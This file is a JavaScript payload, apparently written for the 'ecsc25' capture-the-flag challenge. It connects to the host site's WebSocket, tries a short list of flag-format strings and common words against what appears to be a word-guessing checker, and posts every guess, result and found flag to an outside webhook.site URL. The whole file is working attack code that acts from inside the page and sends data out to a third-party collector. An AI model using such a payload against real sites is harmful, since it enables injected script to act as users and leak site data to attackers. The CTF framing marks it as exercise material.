const LOG_URL = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588';

// List of words to try - ADD MORE CTF-SPECIFIC FLAGS!
const words = [
    "ecsc25{",
    "ecsc25}",
    "ecsc25{test}",
    "ecsc25{flag}",
    "ecsc25",
    "flag{",
    "flag}",
    "ctf{",
    "ctf}",
    "cert{",
    "cert}",
    "certle{",
    "certle}",
    // Try some actual words from the game too
    "apple",
    "house",
    "water",
    "music",
    "paper"
];

let currentIndex = 0;

// Open WebSocket to the CTF server
const ctfDomain = window.location.hostname;
const ws = new WebSocket(`wss://${ctfDomain}/ws`);

ws.onopen = function() {
    console.log('Connected to WebSocket');
    sendNextGuess();
};

ws.onmessage = function(event) {
    const results = JSON.parse(event.data);
    console.log('Results for', words[currentIndex-1], ':', results);

    // Send results to webhook
    fetch(LOG_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            guess: words[currentIndex-1], 
            results: results,
            timestamp: new Date().toISOString()
        })
    }).catch(err => console.error('Error sending log:', err));

    // Check if all are green
    if (results.every(color => color === 'green')) {
        console.log('Flag found:', words[currentIndex-1]);
        // Send the flag to webhook
        fetch(LOG_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                flag: words[currentIndex-1],
                found: true,
                timestamp: new Date().toISOString()
            })
        }).catch(err => console.error('Error sending flag:', err));
    } else {
        // Send next guess
        setTimeout(sendNextGuess, 100);
    }
};

function sendNextGuess() {
    if (currentIndex < words.length) {
        ws.send(JSON.stringify({ answer: words[currentIndex] }));
        currentIndex++;
    } else {
        console.log('No more words to try');
        // Send completion message
        fetch(LOG_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                completed: true,
                message: "All words tried",
                timestamp: new Date().toISOString()
            })
        }).catch(err => console.error('Error sending completion:', err));
    }
}
